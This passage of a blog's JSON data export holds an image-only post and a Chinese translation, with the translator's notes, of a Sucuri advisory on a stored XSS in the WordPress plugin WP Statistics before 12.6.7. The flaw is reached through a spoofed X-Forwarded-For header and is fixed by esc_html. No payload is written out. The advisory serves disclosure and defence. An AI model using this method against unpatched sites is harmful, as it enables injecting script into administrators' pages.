alt=\"32\"></a></p>"},{"title":"准备好了吗？孩子们！","top_img":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg","cover":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/20180705173116_lgqlq.jpeg","date":"2020-09-17T07:14:51.000Z","_content":"\n\n\n![20180705173116_lgqlq](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/20180705173116_lgqlq.jpeg)\n\n![20180705173116_tzvgc](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/20180705173116_tzvgc.jpeg)\n\n![20180705173117_hdeus](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/20180705173117_hdeus.jpeg)\n\n![20180705173117_uqsml](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/20180705173117_uqsml.jpeg)\n\n![20180705173118_hudfz](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/20180705173118_hudfz.jpeg)\n\n![20180705173117_uqsml](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/20180705173117_uqsml.jpeg)\n\n\n\n![20180705173119_igjca](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/20180705173119_igjca.jpeg)\n\n![20180705173119_fxqot](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/20180705173119_fxqot.jpeg)","source":"_posts/Spongebob.md","raw":"---\ntitle: 准备好了吗？孩子们！\ntags: 杂文\ncategories: 日常\ntop_img: 'https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg'\ncover: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/20180705173116_lgqlq.jpeg\ndate: 2020-09-17 15:14:51\n---\n\n\n\n![20180705173116_lgqlq](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/20180705173116_lgqlq.jpeg)\n\n![20180705173116_tzvgc](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/20180705173116_tzvgc.jpeg)\n\n![20180705173117_hdeus](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/20180705173117_hdeus.jpeg)\n\n![20180705173117_uqsml](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/20180705173117_uqsml.jpeg)\n\n![20180705173118_hudfz](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/20180705173118_hudfz.jpeg)\n\n![20180705173117_uqsml](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/20180705173117_uqsml.jpeg)\n\n\n\n![20180705173119_igjca](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/20180705173119_igjca.jpeg)\n\n![20180705173119_fxqot](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/20180705173119_fxqot.jpeg)","slug":"Spongebob","published":1,"updated":"2020-10-27T09:25:29.797Z","_id":"ckgrozu8s001nwsa9dzw9h2bj","comments":1,"layout":"post","photos":[],"link":"","content":"<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/20180705173116_lgqlq.jpeg\" alt=\"20180705173116_lgqlq\"></p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/20180705173116_tzvgc.jpeg\" alt=\"20180705173116_tzvgc\"></p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/20180705173117_hdeus.jpeg\" alt=\"20180705173117_hdeus\"></p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/20180705173117_uqsml.jpeg\" alt=\"20180705173117_uqsml\"></p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/20180705173118_hudfz.jpeg\" alt=\"20180705173118_hudfz\"></p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/20180705173117_uqsml.jpeg\" alt=\"20180705173117_uqsml\"></p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/20180705173119_igjca.jpeg\" alt=\"20180705173119_igjca\"></p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/20180705173119_fxqot.jpeg\" alt=\"20180705173119_fxqot\"></p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"xxlegend","link":"http://xxlegend.com/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/xxlegend.png"},{"name":"phithon","link":"https://www.leavesongs.com","avatar":"https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g"},{"name":"ADOG","link":"http://foreversong.cn/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信图片_20200916153556.jpg"},{"name":"kylingit","link":"https://kylingit.com","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/logo.jpg"},{"name":"tsang","link":"https://jontsang.github.io","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.png"},{"name":"BlBana","link":"https://drops.blbana.cc","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Misaka.jpg"},{"name":"ChaBug安全","link":"http://www.chabug.org","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信截图_20200918105651.png"}]}]}},"excerpt":"","more":"<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/20180705173116_lgqlq.jpeg\" alt=\"20180705173116_lgqlq\"></p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/20180705173116_tzvgc.jpeg\" alt=\"20180705173116_tzvgc\"></p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/20180705173117_hdeus.jpeg\" alt=\"20180705173117_hdeus\"></p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/20180705173117_uqsml.jpeg\" alt=\"20180705173117_uqsml\"></p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/20180705173118_hudfz.jpeg\" alt=\"20180705173118_hudfz\"></p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/20180705173117_uqsml.jpeg\" alt=\"20180705173117_uqsml\"></p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/20180705173119_igjca.jpeg\" alt=\"20180705173119_igjca\"></p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/20180705173119_fxqot.jpeg\" alt=\"20180705173119_fxqot\"></p>\n"},{"title":"【翻译】WordPress WP Statistics插件存储型XSS漏洞分析","date":"2019-09-26T03:14:25.000Z","cover":"https://s2.ax1x.com/2019/09/26/ummMJH.png","top_img":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg","_content":"\n最近，笔者在研究一些与WordPress漏洞相关内容。Sucuri、RIPS、Fortinet等安全公司对WordPress有着一系列的深入研究，因此笔者计划陆续将一些有意思文章翻译出来，与大家共同学习下，祝君多挖漏洞。\n\n这篇文章是来自Sucuri Labs，本文介绍了强大的 WordPress 统计分析插件 WP Statistics的一个xss漏洞以及与防火墙的组合利用，文中括号加粗的是我自己分析这个原稿的一些见解，大家可以在评论里一起讨论下。\n\n<!--more-->\n\n下面翻译稿正文开始\n\n \n\n**风险评级：**次要：可用于有针对性攻击，但需要特定配置后利用。\n\n漏洞名称：存储型XSS漏洞\n\n修复版本： 12.6.7\n\n \n\nWordPress插件[WP Statistics](https://wordpress.org/plugins/wp-statistics/)具有50万用户的活动安装基础，在**12.6.7**之前的版本上存在未经**身份**验证的存储XSS漏洞。\n\n此漏洞只能在某些配置下使用 - 默认设置不易受到攻击。\n\n## 时间线 \n\n·   2019/06/26 - 初步与开发人员取得联系。\n\n·   2019/06/27 - 开发人员回应，披露漏洞。\n\n·   2019/06/30 - 拟议审核补丁。\n\n·   2019/07/01 - 版本12.6.7发布，修复漏洞。\n\n## 通过IP操作存储型XSS漏洞\n\n在该插件某些配置情况下，网站可以使用header来查找访问者的IP。\n\n在使用防火墙的环境中，经常会需要这样的方式**(译者注：使用header来查找访问者的IP)**，否则所有访问者都会拥代理的IP而不是自己的IP。\n\n### 为什么使用防火墙需要使用Header\n\n默认情况下，网站可以轻松找到访问用户的IP地址。并且找到的一定是发起请求User的IP，如下图所示：\n\n![umSZ4K.png](https://s2.ax1x.com/2019/09/26/umSZ4K.png)\n\n请求访问没有防火墙的网站\n\n当使用网站防火墙时，事情就会变得有些棘手；要么优化我们的性能，要么保护我们自己免受攻击。\n\n由于用户的请求在到达网站前，已经通过了防火墙，因此网站无法利用连接地址来找出实际发起请求的IP。\n\n![umSm9O.png](https://s2.ax1x.com/2019/09/26/umSm9O.png)\n\n忽略原始用户IP，使用防火墙代理发起访问请求\n\n为了解决这种情况，防火墙通常会在HTTP header中自动添加用户原始IP。\n\n![umSuge.png](https://s2.ax1x.com/2019/09/26/umSuge.png)\n\n防火墙会转送请求访问的原始用户IP\n\n这使得网站能够正确识别原始用户以及其相应的IP。\n\n### 多层防火墙\n\n当攻击者自己构造forwarded IP（即使这个IP并不存在）时，可能会使服务器弄错原始IP。**（译者注：这里的意思是，攻击者在自己发出的原始报文中，加入了一个forwarded IP，例如下图中，加入一个Forwarded: 123,当最终website读取用户IP时，会误认为123是原始IP，即使123可能不存在）**使用多层防火墙时也会有这种情况出现，因为每一层都会在现有的基础上再添加一个IP地址。\n\n这完全取决于防火墙的配置方式，以及它如何处理现有的转送数据。\n\n![umSn3D.png](https://s2.ax1x.com/2019/09/26/umSn3D.png)\n\n用户发送一个forwarded IP，混淆服务器\n\n大多数防火墙都会将用户的真实IP加入HTTP header自定义字段里，例如**X_SUCURI_CLIENTIP（译者注：SUCURI是这篇文章的公司的名字，这个字段是他家防火墙header里的存放用户的真实IP的自定义字段）**。\n\n此HTTP header里始终含有用户原始IP信息，因为它应该永远不会存在于防火墙之外的环境里。因此，即使存在也会被被覆盖**（译者注：即使攻击者在自己的报文里构造了X_SUCURI_CLIENTIP，在被SUCURI防火墙转发时，这个值也会被覆盖掉）**。\n\n在您有多个代理的情况下，您可能希望获取用户真实IP，而不是最后进行连接的IP。在这种情况下，您可以使用可包含多个IP地址的**X-forwarded-for**。\n\n如果**X-forwarded-for**在连接防火墙之前已具有IP值，则将执行以下某一项操作：\n\n·   将用户的IP附加到任意现有IP列表中。\n\n·   保持原样; 不添加或替换值。\n\n·   清除header; 删除所有值。\n\n·   使用用户的IP覆盖header。\n\n这些结果可能取决于所使用的防火墙和它的配置的不同而不同，最终保证多级防火墙来正确地发送所述用户信息给服务器。\n\n[![umSVN6.png](https://s2.ax1x.com/2019/09/26/umSVN6.png)](https://imgchr.com/i/umSVN6)\n\n## 漏洞分析\n\n该插件的漏洞是由于不过滤或验证用户IP所产生的。\n\n只有当插件使用header字段来识别访问者的IP地址（例如，不是**REMOTE_ADDR**）时，才能触发利用：\n\n![umSKjH.png](https://s2.ax1x.com/2019/09/26/umSKjH.png)\n\n插件的设置页面：使用X_Forwarded_For来获取IP\n\n该漏洞利用触发还必须满足以下两个条件之一：\n\n·   防火墙必须是可*绕过的*。*\n\n*这意味着必须将网站配置为接受来自于所有人的连接，而不仅仅是接受使用防火墙端口转发的连接。\n\n**(译者注：这里作者“防火墙必须是可绕过”的意思是，攻击者的请求，可以不经过防火墙，直接发送至wordpress站点)**\n\n**或者**\n\n·   防火墙必须原样保留header，如果其存在的话。\n\n![umSlDA.png](https://s2.ax1x.com/2019/09/26/umSlDA.png)\n\n防火墙转发访问请求时保持forwarded IP不变\n\n以上两个利用条件的共同点是forwarded值完全由攻击者控制。\n\n启用WAF使您不会容轻易遭受攻击（请[参阅此处以获取有关如何防止防火墙旁路的说明](https://kb.sucuri.net/firewall/Configuration/preventing-bypass)），除非攻击者可以绕过WAF；或者防火墙被配置为保持IP不变。\n\n如果您以前使用过WAF，但是在未更新插件设置的情况下停止运行，则可能会受到攻击。\n\n由于header可以包含多个IP地址，具体取决于防火墙的数量及其配置，因此插件将首先取出完整的header IP列表值，然后在提供多个地址的情况下遍历IP列表，依次向右边的寻找并将IP值替换为有效地址**(译者注：原理可以看下面那个代码段的图)**。\n\n在这两种易受攻击的配置中， IP变量完全由攻击者控制。这使得他们可以将恶意JavaScript代码作为自己的IP注入，并将这些代码存储在管理页面上并执行。\n\n## 技术细节\n\n该插件使用**class-wp-statistics.php**文件中的**get_IP**方法。\n\n![umSQud.png](https://s2.ax1x.com/2019/09/26/umSQud.png)\n\nIP变量的默认值为设置中提供的header，默认情况下为**REMOTE_ADDR（译者注：默认配置情况下不存在漏洞，具体配置见上文插件的设置页面）**。如果有多个以逗号分隔的IP地址，则该插件将使用最后一个有效的IP地址\n\n由于IP地址的默认值是header的值，并且未使用**FILTER_VALIDATE_IP**方法进行清理或验证，因此当header中没有多个IP地址时，它将按原样存储。\n\n在top visitor，online users与最近访问者等模块中，访问者IP将作为页面的一部分输出，它是插件概述页面的一部分。\n\n**（译者注：我对于上述的理解是，插件设置页面提供了一个用户自己选择获取ip的方式”the items below return the ip address that is different on each server. Is the best way that you choose”，如果用户选的是X_Forwarded_For方式，$user_ip里获得的是X_Forwarded_For中的值，攻击者在X_Forwarded_For中传入xss payload，由于不是合法的ip格式，在foreach里的filter_var结果为false，因此不会进入if中执行$user_ip=$ip语句，$user_ip中值仍然是xss payload，最终，在代码最后一个else中赋值给$this->ip并return）**\n\n \n\n## 结论\n\n某种类型的信息看起来可能是安全的（像是访问者的IP地址），但实际上与预期相悖。由于开发人员的某些臆断，使得攻击者可以在在管理页面上注入恶意代码，从而导致整个网络瘫痪。\n\n为了不受此漏洞影响，我们强烈建议用户尽快将插件更新到**12.6.7**版。\n\n原文地址：<https://blog.sucuri.net/2019/07/wordpress-plugin-wp-statistics-unauthenticated-stored-xss-under-certain-configurations.html>\n\n## 写在翻译稿后面\n\n我跟踪了下wp-statistics的修复\n\n![umS1HI.png](https://s2.ax1x.com/2019/09/26/umS1HI.png)\n\n使用esc_html对获取到的IP进行过滤\n\n虽然现在仍然可以在header里传payload，但是由于esc_html的转义，到页面渲染的时候，payload已经失效，流程见下图\n\n![umS8Et.png](https://s2.ax1x.com/2019/09/26/umS8Et.png)","source":"_posts/WordPress-Plugin-WP-Statistics-XSS.md","raw":"---\ntitle: 【翻译】WordPress WP Statistics插件存储型XSS漏洞分析\ndate: 2019-09-26 11:14:25\ntags: 翻译\ncategories: 技术\ncover: https://s2.ax1x.com/2019/09/26/ummMJH.png\ntop_img: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg\n---\n\n最近，笔者在研究一些与WordPress漏洞相关内容。Sucuri、RIPS、Fortinet等安全公司对WordPress有着一系列的深入研究，因此笔者计划陆续将一些有意思文章翻译出来，与大家共同学习下，祝君多挖漏洞。\n\n这篇文章是来自Sucuri Labs，本文介绍了强大的 WordPress 统计分析插件 WP Statistics的一个xss漏洞以及与防火墙的组合利用，文中括号加粗的是我自己分析这个原稿的一些见解，大家可以在评论里一起讨论下。\n\n<!--more-->\n\n下面翻译稿正文开始\n\n \n\n**风险评级：**次要：可用于有针对性攻击，但需要特定配置后利用。\n\n漏洞名称：存储型XSS漏洞\n\n修复版本： 12.6.7\n\n \n\nWordPress插件[WP Statistics](https://wordpress.org/plugins/wp-statistics/)具有50万用户的活动安装基础，在**12.6.7**之前的版本上存在未经**身份**验证的存储XSS漏洞。\n\n此漏洞只能在某些配置下使用 - 默认设置不易受到攻击。\n\n## 时间线 \n\n·   2019/06/26 - 初步与开发人员取得联系。\n\n·   2019/06/27 - 开发人员回应，披露漏洞。\n\n·   2019/06/30 - 拟议审核补丁。\n\n·   2019/07/01 - 版本12.6.7发布，修复漏洞。\n\n## 通过IP操作存储型XSS漏洞\n\n在该插件某些配置情况下，网站可以使用header来查找访问者的IP。\n\n在使用防火墙的环境中，经常会需要这样的方式**(译者注：使用header来查找访问者的IP)**，否则所有访问者都会拥代理的IP而不是自己的IP。\n\n### 为什么使用防火墙需要使用Header\n\n默认情况下，网站可以轻松找到访问用户的IP地址。并且找到的一定是发起请求User的IP，如下图所示：\n\n![umSZ4K.png](https://s2.ax1x.com/2019/09/26/umSZ4K.png)\n\n请求访问没有防火墙的网站\n\n当使用网站防火墙时，事情就会变得有些棘手；要么优化我们的性能，要么保护我们自己免受攻击。\n\n由于用户的请求在到达网站前，已经通过了防火墙，因此网站无法利用连接地址来找出实际发起请求的IP。\n\n![umSm9O.png](https://s2.ax1x.com/2019/09/26/umSm9O.png)\n\n忽略原始用户IP，使用防火墙代理发起访问请求\n\n为了解决这种情况，防火墙通常会在HTTP header中自动添加用户原始IP。\n\n![umSuge.png](https://s2.ax1x.com/2019/09/26/umSuge.png)\n\n防火墙会转送请求访问的原始用户IP\n\n这使得网站能够正确识别原始用户以及其相应的IP。\n\n### 多层防火墙\n\n当攻击者自己构造forwarded IP（即使这个IP并不存在）时，可能会使服务器弄错原始IP。**（译者注：这里的意思是，攻击者在自己发出的原始报文中，加入了一个forwarded IP，例如下图中，加入一个Forwarded: 123,当最终website读取用户IP时，会误认为123是原始IP，即使123可能不存在）**使用多层防火墙时也会有这种情况出现，因为每一层都会在现有的基础上再添加一个IP地址。\n\n这完全取决于防火墙的配置方式，以及它如何处理现有的转送数据。\n\n![umSn3D.png](https://s2.ax1x.com/2019/09/26/umSn3D.png)\n\n用户发送一个forwarded IP，混淆服务器\n\n大多数防火墙都会将用户的真实IP加入HTTP header自定义字段里，例如**X_SUCURI_CLIENTIP（译者注：SUCURI是这篇文章的公司的名字，这个字段是他家防火墙header里的存放用户的真实IP的自定义字段）**。\n\n此HTTP header里始终含有用户原始IP信息，因为它应该永远不会存在于防火墙之外的环境里。因此，即使存在也会被被覆盖**（译者注：即使攻击者在自己的报文里构造了X_SUCURI_CLIENTIP，在被SUCURI防火墙转发时，这个值也会被覆盖掉）**。\n\n在您有多个代理的情况下，您可能希望获取用户真实IP，而不是最后进行连接的IP。在这种情况下，您可以使用可包含多个IP地址的**X-forwarded-for**。\n\n如果**X-forwarded-for**在连接防火墙之前已具有IP值，则将执行以下某一项操作：\n\n·   将用户的IP附加到任意现有IP列表中。\n\n·   保持原样; 不添加或替换值。\n\n·   清除header; 删除所有值。\n\n·   使用用户的IP覆盖header。\n\n这些结果可能取决于所使用的防火墙和它的配置的不同而不同，最终保证多级防火墙来正确地发送所述用户信息给服务器。\n\n[![umSVN6.png](https://s2.ax1x.com/2019/09/26/umSVN6.png)](https://imgchr.com/i/umSVN6)\n\n## 漏洞分析\n\n该插件的漏洞是由于不过滤或验证用户IP所产生的。\n\n只有当插件使用header字段来识别访问者的IP地址（例如，不是**REMOTE_ADDR**）时，才能触发利用：\n\n![umSKjH.png](https://s2.ax1x.com/2019/09/26/umSKjH.png)\n\n插件的设置页面：使用X_Forwarded_For来获取IP\n\n该漏洞利用触发还必须满足以下两个条件之一：\n\n·   防火墙必须是可*绕过的*。*\n\n*这意味着必须将网站配置为接受来自于所有人的连接，而不仅仅是接受使用防火墙端口转发的连接。\n\n**(译者注：这里作者“防火墙必须是可绕过”的意思是，攻击者的请求，可以不经过防火墙，直接发送至wordpress站点)**\n\n**或者**\n\n·   防火墙必须原样保留header，如果其存在的话。\n\n![umSlDA.png](https://s2.ax1x.com/2019/09/26/umSlDA.png)\n\n防火墙转发访问请求时保持forwarded IP不变\n\n以上两个利用条件的共同点是forwarded值完全由攻击者控制。\n\n启用WAF使您不会容轻易遭受攻击（请[参阅此处以获取有关如何防止防火墙旁路的说明](https://kb.sucuri.net/firewall/Configuration/preventing-bypass)），除非攻击者可以绕过WAF；或者防火墙被配置为保持IP不变。\n\n如果您以前使用过WAF，但是在未更新插件设置的情况下停止运行，则可能会受到攻击。\n\n由于header可以包含多个IP地址，具体取决于防火墙的数量及其配置，因此插件将首先取出完整的header IP列表值，然后在提供多个地址的情况下遍历IP列表，依次向右边的寻找并将IP值替换为有效地址**(译者注：原理可以看下面那个代码段的图)**。\n\n在这两种易受攻击的配置中， IP变量完全由攻击者控制。这使得他们可以将恶意JavaScript代码作为自己的IP注入，并将这些代码存储在管理页面上并执行。\n\n## 技术细节\n\n该插件使用**class-wp-statistics.php**文件中的**get_IP**方法。\n\n![umSQud.png](https://s2.ax1x.com/2019/09/26/umSQud.png)\n\nIP变量的默认值为设置中提供的header，默认情况下为**REMOTE_ADDR（译者注：默认配置情况下不存在漏洞，具体配置见上文插件的设置页面）**。如果有多个以逗号分隔的IP地址，则该插件将使用最后一个有效的IP地址\n\n由于IP地址的默认值是header的值，并且未使用**FILTER_VALIDATE_IP**方法进行清理或验证，因此当header中没有多个IP地址时，它将按原样存储。\n\n在top visitor，online users与最近访问者等模块中，访问者IP将作为页面的一部分输出，它是插件概述页面的一部分。\n\n**（译者注：我对于上述的理解是，插件设置页面提供了一个用户自己选择获取ip的方式”the items below return the ip address that is different on each server. Is the best way that you choose”，如果用户选的是X_Forwarded_For方式，$user_ip里获得的是X_Forwarded_For中的值，攻击者在X_Forwarded_For中传入xss payload，由于不是合法的ip格式，在foreach里的filter_var结果为false，因此不会进入if中执行$user_ip=$ip语句，$user_ip中值仍然是xss payload，最终，在代码最后一个else中赋值给$this->ip并return）**\n\n \n\n## 结论\n\n某种类型的信息看起来可能是安全的（像是访问者的IP地址），但实际上与预期相悖。由于开发人员的某些臆断，使得攻击者可以在在管理页面上注入恶意代码，从而导致整个网络瘫痪。\n\n为了不受此漏洞影响，我们强烈建议用户尽快将插件更新到**12.6.7**版。\n\n原文地址：<https://blog.sucuri.net/2019/07/wordpress-plugin-wp-statistics-unauthenticated-stored-xss-under-certain-configurations.html>\n\n## 写在翻译稿后面\n\n我跟踪了下wp-statistics的修复\n\n![umS1HI.png](https://s2.ax1x.com/2019/09/26/umS1HI.png)\n\n使用esc_html对获取到的IP进行过滤\n\n虽然现在仍然可以在header里传payload，但是由于esc_html的转义，到页面渲染的时候，payload已经失效，流程见下图\n\n![umS8Et.png](https://s2.ax1x.com/2019/09/26/umS8Et.png)","slug":"WordPress-Plugin-WP-Statistics-XSS","published":1,"updated":"2020-10-27T09:25:30.013Z","_id":"ckgrozu8t001qwsa9egl6gp9z","comments":1,"layout":"post","photos":[],"link":"","content":"<p>最近，笔者在研究一些与WordPress漏洞相关内容。Sucuri、RIPS、Fortinet等安全公司对WordPress有着一系列的深入研究，因此笔者计划陆续将一些有意思文章翻译出来，与大家共同学习下，祝君多挖漏洞。</p>\n<p>这篇文章是来自Sucuri Labs，本文介绍了强大的 WordPress 统计分析插件 WP Statistics的一个xss漏洞以及与防火墙的组合利用，文中括号加粗的是我自己分析这个原稿的一些见解，大家可以在评论里一起讨论下。</p>\n<a id=\"more\"></a>\n\n<p>下面翻译稿正文开始</p>\n<p><strong>风险评级：</strong>次要：可用于有针对性攻击，但需要特定配置后利用。</p>\n<p>漏洞名称：存储型XSS漏洞</p>\n<p>修复版本： 12.6.7</p>\n<p>WordPress插件<a href=\"https://wordpress.org/plugins/wp-statistics/\">WP Statistics</a>具有50万用户的活动安装基础，在<strong>12.6.7</strong>之前的版本上存在未经<strong>身份</strong>验证的存储XSS漏洞。</p>\n<p>此漏洞只能在某些配置下使用 - 默认设置不易受到攻击。</p>\n<h2 id=\"时间线\"><a href=\"#时间线\" class=\"headerlink\" title=\"时间线\"></a>时间线</h2><p>·   2019/06/26 - 初步与开发人员取得联系。</p>\n<p>·   2019/06/27 - 开发人员回应，披露漏洞。</p>\n<p>·   2019/06/30 - 拟议审核补丁。</p>\n<p>·   2019/07/01 - 版本12.6.7发布，修复漏洞。</p>\n<h2 id=\"通过IP操作存储型XSS漏洞\"><a href=\"#通过IP操作存储型XSS漏洞\" class=\"headerlink\" title=\"通过IP操作存储型XSS漏洞\"></a>通过IP操作存储型XSS漏洞</h2><p>在该插件某些配置情况下，网站可以使用header来查找访问者的IP。</p>\n<p>在使用防火墙的环境中，经常会需要这样的方式**(译者注：使用header来查找访问者的IP)**，否则所有访问者都会拥代理的IP而不是自己的IP。</p>\n<h3 id=\"为什么使用防火墙需要使用Header\"><a href=\"#为什么使用防火墙需要使用Header\" class=\"headerlink\" title=\"为什么使用防火墙需要使用Header\"></a>为什么使用防火墙需要使用Header</h3><p>默认情况下，网站可以轻松找到访问用户的IP地址。并且找到的一定是发起请求User的IP，如下图所示：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/09/26/umSZ4K.png\" alt=\"umSZ4K.png\"></p>\n<p>请求访问没有防火墙的网站</p>\n<p>当使用网站防火墙时，事情就会变得有些棘手；要么优化我们的性能，要么保护我们自己免受攻击。</p>\n<p>由于用户的请求在到达网站前，已经通过了防火墙，因此网站无法利用连接地址来找出实际发起请求的IP。</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/09/26/umSm9O.png\" alt=\"umSm9O.png\"></p>\n<p>忽略原始用户IP，使用防火墙代理发起访问请求</p>\n<p>为了解决这种情况，防火墙通常会在HTTP header中自动添加用户原始IP。</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/09/26/umSuge.png\" alt=\"umSuge.png\"></p>\n<p>防火墙会转送请求访问的原始用户IP</p>\n<p>这使得网站能够正确识别原始用户以及其相应的IP。</p>\n<h3 id=\"多层防火墙\"><a href=\"#多层防火墙\" class=\"headerlink\" title=\"多层防火墙\"></a>多层防火墙</h3><p>当攻击者自己构造forwarded IP（即使这个IP并不存在）时，可能会使服务器弄错原始IP。<strong>（译者注：这里的意思是，攻击者在自己发出的原始报文中，加入了一个forwarded IP，例如下图中，加入一个Forwarded: 123,当最终website读取用户IP时，会误认为123是原始IP，即使123可能不存在）</strong>使用多层防火墙时也会有这种情况出现，因为每一层都会在现有的基础上再添加一个IP地址。</p>\n<p>这完全取决于防火墙的配置方式，以及它如何处理现有的转送数据。</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/09/26/umSn3D.png\" alt=\"umSn3D.png\"></p>\n<p>用户发送一个forwarded IP，混淆服务器</p>\n<p>大多数防火墙都会将用户的真实IP加入HTTP header自定义字段里，例如<strong>X_SUCURI_CLIENTIP（译者注：SUCURI是这篇文章的公司的名字，这个字段是他家防火墙header里的存放用户的真实IP的自定义字段）</strong>。</p>\n<p>此HTTP header里始终含有用户原始IP信息，因为它应该永远不会存在于防火墙之外的环境里。因此，即使存在也会被被覆盖<strong>（译者注：即使攻击者在自己的报文里构造了X_SUCURI_CLIENTIP，在被SUCURI防火墙转发时，这个值也会被覆盖掉）</strong>。</p>\n<p>在您有多个代理的情况下，您可能希望获取用户真实IP，而不是最后进行连接的IP。在这种情况下，您可以使用可包含多个IP地址的<strong>X-forwarded-for</strong>。</p>\n<p>如果<strong>X-forwarded-for</strong>在连接防火墙之前已具有IP值，则将执行以下某一项操作：</p>\n<p>·   将用户的IP附加到任意现有IP列表中。</p>\n<p>·   保持原样; 不添加或替换值。</p>\n<p>·   清除header; 删除所有值。</p>\n<p>·   使用用户的IP覆盖header。</p>\n<p>这些结果可能取决于所使用的防火墙和它的配置的不同而不同，最终保证多级防火墙来正确地发送所述用户信息给服务器。</p>\n<p><a href=\"https://imgchr.com/i/umSVN6\"><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/09/26/umSVN6.png\" alt=\"umSVN6.png\"></a></p>\n<h2 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h2><p>该插件的漏洞是由于不过滤或验证用户IP所产生的。</p>\n<p>只有当插件使用header字段来识别访问者的IP地址（例如，不是<strong>REMOTE_ADDR</strong>）时，才能触发利用：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/09/26/umSKjH.png\" alt=\"umSKjH.png\"></p>\n<p>插件的设置页面：使用X_Forwarded_For来获取IP</p>\n<p>该漏洞利用触发还必须满足以下两个条件之一：</p>\n<p>·   防火墙必须是可<em>绕过的</em>。*</p>\n<p>*这意味着必须将网站配置为接受来自于所有人的连接，而不仅仅是接受使用防火墙端口转发的连接。</p>\n<p><strong>(译者注：这里作者“防火墙必须是可绕过”的意思是，攻击者的请求，可以不经过防火墙，直接发送至wordpress站点)</strong></p>\n<p><strong>或者</strong></p>\n<p>·   防火墙必须原样保留header，如果其存在的话。</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/09/26/umSlDA.png\" alt=\"umSlDA.png\"></p>\n<p>防火墙转发访问请求时保持forwarded IP不变</p>\n<p>以上两个利用条件的共同点是forwarded值完全由攻击者控制。</p>\n<p>启用WAF使您不会容轻易遭受攻击（请<a href=\"https://kb.sucuri.net/firewall/Configuration/preventing-bypass\">参阅此处以获取有关如何防止防火墙旁路的说明</a>），除非攻击者可以绕过WAF；或者防火墙被配置为保持IP不变。</p>\n<p>如果您以前使用过WAF，但是在未更新插件设置的情况下停止运行，则可能会受到攻击。</p>\n<p>由于header可以包含多个IP地址，具体取决于防火墙的数量及其配置，因此插件将首先取出完整的header IP列表值，然后在提供多个地址的情况下遍历IP列表，依次向右边的寻找并将IP值替换为有效地址**(译者注：原理可以看下面那个代码段的图)**。</p>\n<p>在这两种易受攻击的配置中， IP变量完全由攻击者控制。这使得他们可以将恶意JavaScript代码作为自己的IP注入，并将这些代码存储在管理页面上并执行。</p>\n<h2 id=\"技术细节\"><a href=\"#技术细节\" class=\"headerlink\" 